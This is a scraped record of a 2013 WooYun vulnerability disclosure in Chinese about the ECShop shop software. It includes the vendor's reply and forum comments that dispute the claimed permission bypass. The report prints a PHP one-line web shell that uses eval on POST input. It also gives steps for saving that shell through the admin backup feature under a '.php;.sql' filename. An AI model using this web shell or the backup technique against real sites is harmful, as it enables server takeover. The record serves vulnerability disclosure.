{"id": 12846, "wybug_id": "wooyun-2013-020857", "wybug_title": "ECSHOP网站程序可以绕过权限上传一句话木马", "wybug_corp": "ShopEx", "wybug_author": "heaven", "wybug_date": "2013-03-29 10:59", "wybug_open_date": "2013-05-13 10:59", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-13：\t细节向公众公开  简要描述： 可以绕过权限上传一句话木马 详细说明：  \n\n前台留个言，内容是我们的一句话木马：<?php eval($_POST[cmd]);?>\n\n接着在后台系统==>数据库管理==>数据备份==>选择自定义备份，选择ecs_feedback这张表（存放留言的表）\n\n\n\n备份文件名：xxx.php;.sql 这种格式来备份\n\n提示成功了。   漏洞证明：  \n\n一句话连接成功\n\n   修复方案：  过滤   版权声明：转载请注明来源 heaven@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-03-29 12:57 厂商回复： 感谢您为shopex安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-08 13:44 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  怎么进后台？    \n     2013-04-11 00:55 |    \t\t少校 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 别开枪，自己人！)\t\t \n  这个洞洞 貌似有点扯淡，能进后台备份，还用前台写一句话？    \n     2013-04-18 13:02 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:29        | Focus On Web Secur1ty)\t\t \n  @少校 脱了裤子打屁~多此一举~    \n     2013-04-18 17:00 |    \t\tiiiiiiiii \t\t\t( 普通白帽子  |\t\t\t        Rank:680 漏洞数:89        | )\t\t \n  。。绕过权限在哪 我怎么没看到    \n     2013-04-19 13:20 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:89        | 一名普通的phper开发者，关注web安全。)\t\t \n  话说这个漏洞没后台。基本无用。。。。有后台也不至于利用这个漏洞。。    \n     2013-04-20 15:27 |    \t\t少校 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 别开枪，自己人！)\t\t \n  @saline 这位兄弟为何说我多此一举？    \n     2013-04-28 18:38 |    \t\t陌路 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 安全爱好者！)\t\t \n  N年前就有知道这个了..还以为什么权限绕过..没有点新的.    \n     2013-04-28 19:15 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:19        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  亮点在楼主的解析漏洞 apache or nginx有这么玩的？    \n     2013-04-28 20:27 |    \t\tDeep \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 一个小白.想要变小黑.)\t\t \n  晕了。    \n     2013-04-28 22:05 |    \t\t枫桦 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一个普通人!)\t\t \n  @heaven  怎么绕进后台的？？？求解！    \n     2013-04-30 10:43 |    \t\t脚本小伙 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:15        | 小书童)\t\t \n  标题明明写着ecshop 为什么厂商是shopex 碉堡了     \n     2013-05-01 10:14 |    \t\t枫桦 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一个普通人!)\t\t \n  @脚本小伙 ...ecshop 貌似和shopex是一家。。而且是下家。。。你碉堡了!    \n     2013-05-13 11:05 |    \t\t0xTback \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 初入江湖，请多多关照~！！！)\t\t \n  绕过后台才是关键~！！    \n     2013-05-13 11:17 |    \t\tFalcon \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 专业从事，暗杀，刺杀，投毒，潜伏，搏击，...)\t\t \n  打到他！哈哈哈！    \n     2013-05-13 11:32 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  我怎么没看到绕过权限。？！我还以为是ECSHOP的新0day 尼玛，原来是公布已久的拿shell方法- -。 请洞主珍惜ID呀。。    \n     2013-05-13 12:16 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:67        | 活到老，学到老!)\t\t \n  太失望了 以为有0day    \n     2013-05-13 14:00 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n  @conqu3r 我也觉得是这样，长见识了。    \n     2013-05-13 14:40 |    \t\tkhjian \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:64        | 网站程序员，项目经理，擅长asp,php,asp.ne...)\t\t \n  真晕，哪有绕过啊？    \n     2013-05-14 15:12 |    \t\tEl4pse \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 世界上从来没有不可能这几个字，可不可能完...)\t\t \n  仅对存在解析漏洞的才能利用。。。    \n     2013-05-16 12:19 |    \t\tMissye \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | wu)\t\t \n   文章名字应该在 后台提权得shell。。。。    \n     2013-07-23 14:17 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  碉堡了。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}